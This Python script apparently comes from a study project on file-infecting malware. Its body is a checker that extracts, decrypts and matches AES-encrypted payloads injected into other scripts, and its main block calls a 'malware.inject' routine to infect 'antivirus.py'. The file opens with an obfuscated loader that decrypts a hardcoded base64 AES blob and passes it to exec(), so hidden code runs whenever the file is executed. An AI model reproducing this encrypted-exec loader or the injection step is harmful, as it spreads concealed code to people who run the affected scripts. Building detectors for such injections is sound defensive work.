
import base64
from Crypto.Cipher import AES
key = base64.b64decode("""EY6M4yPsclhUGLnI1i800A==""")
c1 = base64.b64decode("""wGDDsWajk6IiKLZswffW9d3v7c8LTMnjpG6DdfQJJBD/t5B549ZC0s8Ig9jhnSPuRrjZaKEZmNVMN8laECUI4pxbHxGb05NR0MJFSesoNcX9TwFFMr8rWoR++TFnJ0wFqpyU3s3jouH01+oqoN+i/T3s+RaP2vjAJ2LS01pxIiE=""")
cipher = AES.new(key)
c2 = cipher.decrypt(c1).decode()
exec(c2)
import sys
import base64
from Crypto.Cipher import AES
import malware


def findEncryption(filename , pattern):
    file = open(filename , "r")
    injected = file.readlines()

    foundPattern = False
    theLine = None
    theString = ""
    for line in injected:     
        if (pattern in line):
            foundPattern = True
            theLine = line 
            break
    if(foundPattern == True ):
        stringStart = False 
        for character in theLine:
            if (character == "("):
                stringStart = True
            elif (character == ")"):
                break
            elif(stringStart == True):
                theString = theString + character
    
    if (theString == ""):
        return None              
    return theString

def openFile(filename):
    with open(filename, "r") as file:
        payload = file.read().encode('utf-8')
    return payload

def check(filename):
    result = 0
    key = findEncryption(filename, "key = base64.b64decode(\"")
    c1 = findEncryption(filename, "c1 = base64.b64decode(\"")
    print(c1)
    print(key)
    c2 = None

    if( c1 != None and key != None ):    
         encryptedKey = base64.b64decode(key)
         encryptedc1 = base64.b64decode(c1)
         cipher = AES.new(encryptedKey, AES.MODE_ECB)
         c2 = cipher.decrypt(encryptedc1)

    else:
        with open(filename, "r") as file:
            c2 = file.read().encode('utf-8')

    payload1 = openFile("payload1.py")
    payload2 = openFile("payload2.py")

    # print(payload1)
    # print("----")
    # print(c2)

    if payload1 in c2:
        result = 1
    elif payload2 in c2:
        result = 2
    else:
        result = None
    return result

if __name__ == '__main__':
    #check("result.py")
    malware.inject("antivirus.py", "payload1.py", "result.py")
    print(check("result.py"))
    print(check(("payload1.py")))
